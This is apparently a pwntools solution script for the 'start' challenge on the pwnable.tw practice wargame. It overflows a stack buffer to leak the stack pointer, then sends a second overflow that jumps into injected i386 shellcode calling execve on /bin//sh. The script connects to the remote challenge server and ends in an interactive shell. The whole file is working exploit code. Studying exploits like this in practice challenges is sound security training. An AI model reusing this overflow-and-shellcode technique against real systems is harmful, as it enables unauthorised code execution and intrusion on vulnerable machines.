from pwn import *

context.update(arch='i386', os='linux')
context.terminal = ['tmux', 'splitw', '-h']
#r = process('./start')
# gdb.attach(proc.pidof(r)[0])
#pause()
r = remote('chall.pwnable.tw', 10000)
shellcode = asm('''
        push 0x68
        push 0x732f2f2f
        push 0x6e69622f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        mov al, 0xb
        int 0x80      
''')
# gdb.attach(r, "b main")
def solve():
    payload = 'a'*0x14 + p32(0x08048087)
    r.sendafter('CTF:', payload)
    esp = u32(r.recv(4))
    payload = 'a'*0x14 + p32(esp+0x14) + shellcode
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    solve()

# sendlineafter and sendafter :((
